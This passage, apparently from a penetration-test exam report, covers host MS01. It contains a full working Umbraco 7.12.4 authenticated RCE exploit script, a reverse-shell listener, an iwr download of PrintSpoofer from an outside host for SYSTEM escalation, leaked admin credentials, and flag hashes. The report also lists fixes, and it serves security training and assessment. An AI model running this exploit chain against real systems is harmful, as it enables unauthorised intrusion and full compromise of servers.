ableCell","content":[{"type":"paragraph"}]}]},{"type":"tableRow","content":[{"type":"tableCell","content":[{"type":"paragraph","content":[{"type":"text","text":"1433/tcp"}]}]},{"type":"tableCell","content":[{"type":"paragraph","content":[{"type":"text","text":"ms-sql-s"}]}]},{"type":"tableCell","content":[{"type":"paragraph","content":[{"type":"text","text":"Microsoft SQL Server 2019 15.00.2000.00"}]}]},{"type":"tableCell","content":[{"type":"paragraph"}]}]},{"type":"tableRow","content":[{"type":"tableCell","content":[{"type":"paragraph","content":[{"type":"text","text":"5985/tcp"}]}]},{"type":"tableCell","content":[{"type":"paragraph","content":[{"type":"text","text":"HTTP"}]}]},{"type":"tableCell","content":[{"type":"paragraph","content":[{"type":"text","text":"Microsoft HTTPAPI httpd 2.0"}]}]},{"type":"tableCell","content":[{"type":"paragraph"}]}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-ms01:foothold"},"content":[{"type":"text","text":"Initial access"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" The Umbraco back office's XSLT visualiser compiles inline C# from the submitted stylesheet. Any back-office user can run commands as the IIS app pool. The admin password was published in /backup/notes.txt on the same site."}],"attrs":{"source":"finding:f-exam-umbraco:explanation"}}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Upgrade Umbraco to a supported release. Remove /backup from the site and rotate the admin password. Restrict /umbraco to the admin network."}],"attrs":{"source":"finding:f-exam-umbraco:fix"}}
{"type":"paragraph","attrs":{"source":"finding:f-exam-umbraco:severity"},"content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" Critical"}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-notes:0:command"},"content":[{"type":"text","text":"curl -s http://10.10.30.5/backup/notes.txt"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-notes:0:output"},"content":[{"type":"text","text":"Go-live checklist (intranet)\\n- move the site to Umbraco 7.12.4                 done\\n- back-office admin: admin@exam.corp / Spring2026!\\n- TODO: rotate the admin password after launch\\n- TODO: remove this folder from IIS"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"python","source":"file:ff-exam-46153"},"content":[{"type":"text","text":"# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators\\n# Date: 2019-01-13\\n# Exploit Author: Gregory DRAPERI & Hugo BOUTINON\\n# Vendor Homepage: http://www.umbraco.com/\\n# Version: 7.12.4\\n# Tested on: Windows IIS\\n\\nimport argparse;\\nimport requests;\\n\\nfrom bs4 import BeautifulSoup;\\n\\nparser = argparse.ArgumentParser(description=\\"Umbraco 7.12.4 authenticated RCE\\");\\nparser.add_argument(\\"-u\\", dest=\\"login\\", required=True);\\nparser.add_argument(\\"-p\\", dest=\\"password\\", required=True);\\nparser.add_argument(\\"-i\\", dest=\\"host\\", required=True);\\nparser.add_argument(\\"-c\\", dest=\\"command\\", default=\\"powershell.exe\\");\\nparser.add_argument(\\"-a\\", dest=\\"arguments\\", default=\\"\\");\\nargs = parser.parse_args();\\n\\npayload = '<?xml version=\\"1.0\\"?><xsl:stylesheet version=\\"1.0\\" xmlns:xsl=\\"http://www.w3.org/1999/XSL/Transform\\" xmlns:msxsl=\\"urn:schemas-microsoft-com:xslt\\" xmlns:csharp_user=\\"http://csharp.mycompany.com/mynamespace\\"><msxsl:script language=\\"C#\\" implements-prefix=\\"csharp_user\\">public string xml() { string cmd = \\"%s\\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \\"%s\\"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </msxsl:script><xsl:template match=\\"/\\"> <xsl:value-of select=\\"csharp_user:xml()\\"/> </xsl:template> </xsl:stylesheet> ' % (args.arguments, args.command);\\n\\nlogin = args.login;\\npassword = args.password;\\nhost = args.host;\\n\\n# Step 1 - Get Main page\\ns = requests.session()\\nurl_main =host+\\"/umbraco/\\";\\nr1 = s.get(url_main);\\nprint(\\"[+] Logging in to %s/umbraco as %s\\" % (host, login));\\n\\n# Step 2 - Process Login\\nurl_login = host+\\"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin\\";\\nloginfo = {\\"username\\":login,\\"password\\":password};\\nr2 = s.post(url_login,json=loginfo);\\nprint(\\"[+] Login OK, back-office session cookie set\\");\\n\\n# Step 3 - Go to vulnerable web page\\nurl_xslt = host+\\"/umbraco/developer/Xslt/xsltVisualize.aspx\\";\\nr3 = s.get(url_xslt);\\n\\nsoup = BeautifulSoup(r3.text, 'html.parser');\\nVIEWSTATE = soup.find(id=\\"__VIEWSTATE\\")['value'];\\nVIEWSTATEGENERATOR = soup.find(id=\\"__VIEWSTATEGENERATOR\\")['value'];\\nUMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];\\nheaders = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};\\ndata = {\\"__EVENTTARGET\\":\\"\\",\\"__EVENTARGUMENT\\":\\"\\",\\"__VIEWSTATE\\":VIEWSTATE,\\"__VIEWSTATEGENERATOR\\":VIEWSTATEGENERATOR,\\"ctl00$body$xsltSelection\\":payload,\\"ctl00$body$contentPicker$ContentIdValue\\":\\"\\",\\"ctl00$body$visualizeDo\\":\\"Visualize+XSLT\\"};\\n\\n# Step 4 - Launch the attack\\nprint(\\"[+] Sending the XSLT payload to /umbraco/developer/Xslt/xsltVisualize.aspx\\");\\nr4 = s.post(url_xslt,data=data,headers=headers);\\nprint(\\"[+] Payload accepted (HTTP %d): %s started on the target\\" % (r4.status_code, args.command));"}]},{"type":"paragraph","attrs":{"hint":"Explain each change"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-rce:0:command"},"content":[{"type":"text","text":"python3 46153.py -u admin@exam.corp -p 'Spring2026!' -i http://10.10.30.5 -c powershell.exe -a \\"-nop -w hidden -e \\""}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-rce:0:output"},"content":[{"type":"text","text":"[+] Logging in to http://10.10.30.5/umbraco as admin@exam.corp\\n[+] Login OK, back-office session cookie set\\n[+] Sending the XSLT payload to /umbraco/developer/Xslt/xsltVisualize.aspx\\n[+] Payload accepted (HTTP 200): powershell.exe started on the target"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-rce:1:command"},"content":[{"type":"text","text":"rlwrap nc -lvnp 443"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-rce:1:output"},"content":[{"type":"text","text":"listening on [any] 443 ...\\nconnect to [192.0.2.10] from (UNKNOWN) [10.10.30.5] 49718\\n\\nPS C:\\\\windows\\\\system32\\\\inetsrv> whoami\\niis apppool\\\\defaultapppool\\nPS C:\\\\windows\\\\system32\\\\inetsrv> hostname\\nMS01"}]},{"type":"figure","attrs":{"attachmentId":"a-ms01-shell","entryId":"l-exam-ms01-shell","source":"entry:l-exam-ms01-shell"},"content":[{"type":"text","text":"Reverse shell on ms01 as the IIS app pool"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say where you read the flag"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-local:proof"},"content":[{"type":"text","text":"PS C:\\\\windows\\\\system32\\\\inetsrv> cd C:\\\\Users\\\\Public\\\\Desktop\\nPS C:\\\\Users\\\\Public\\\\Desktop> type local.txt\\n5f3c9a1e7d2b48c6a0e1f9d3b7c2a4e8\\nPS C:\\\\Users\\\\Public\\\\Desktop> whoami\\n[… 6 lines omitted …]\\n\\n\\nEthernet adapter Ethernet0:\\n   IPv4 Address. . . . . . . . . . . : 10.10.30.5"}]},{"type":"figure","attrs":{"attachmentId":"a-ms01-local","entryId":"l-exam-ms01-local","source":"entry:l-exam-ms01-local"},"content":[{"type":"text","text":"local.txt"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-ms01:privesc"},"content":[{"type":"text","text":"Privilege escalation"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" The IIS app pool holds SeImpersonatePrivilege, so it can impersonate a SYSTEM token caught through the print spooler's named pipe."}],"attrs":{"source":"finding:f-exam-printspoofer:explanation"}}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Run the site under an account without SeImpersonatePrivilege where the platform allows. Disable the Print Spooler service on servers that do not print."}],"attrs":{"source":"finding:f-exam-printspoofer:fix"}}
{"type":"paragraph","attrs":{"source":"finding:f-exam-printspoofer:severity"},"content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" High"}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-privs:0:command"},"content":[{"type":"text","text":"whoami /priv"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-privs:0:output"},"content":[{"type":"text","text":"PRIVILEGES INFORMATION\\n----------------------\\n\\nPrivilege Name                Description                               State\\n============================= ========================================= ========\\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\\nSeAuditPrivilege              Generate security audits                  Disabled\\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\\nSeCreateGlobalPrivilege       Create global objects                     Enabled\\nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-spoofer:0:command"},"content":[{"type":"text","text":"iwr http://192.0.2.10/PrintSpoofer64.exe -OutFile C:\\\\Windows\\\\Tasks\\\\PrintSpoofer64.exe\\nC:\\\\Windows\\\\Tasks\\\\PrintSpoofer64.exe -i -c powershell.exe"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-spoofer:1:output"},"content":[{"type":"text","text":"[+] Found privilege: SeImpersonatePrivilege\\n[+] Named pipe listening...\\n[+] CreateProcessAsUser() OK\\nWindows PowerShell\\nCopyright (C) Microsoft Corporation. All rights reserved.\\n\\nPS C:\\\\Windows\\\\system32> whoami\\nnt authority\\\\system"}]},{"type":"figure","attrs":{"attachmentId":"a-ms01-system","entryId":"l-exam-ms01-system","source":"entry:l-exam-ms01-system"},"content":[{"type":"text","text":"SYSTEM shell on ms01 through PrintSpoofer"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-ms01:post"},"content":[{"type":"text","text":"Post-exploitation"}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say where you read the flag"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ms01-proof:proof"},"content":[{"type":"text","text":"PS C:\\\\Users\\\\Administrator\\\\Desktop> type proof.txt\\nc81e728d9d4c2f636f067f89cc14862c\\nPS C:\\\\Users\\\\Administrator\\\\Desktop> whoami\\nnt authority\\\\system\\n[… 5 lines omitted …]\\n\\n\\nEthernet adapter Ethernet0:\\n   IPv4 Address. . . . . . . . . . . : 10.10.30.5"}]},{"type":"figure","attrs":{"attachmentId":"a-ms01-proof","entryId":"l-exam-ms01-proof","source":"entry:l-exam-ms01-proof"},"content":[{"type":"text","text":"proof.txt"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-ms01:tested"},"content":[{"type":"text","text":"Also tested"}]}
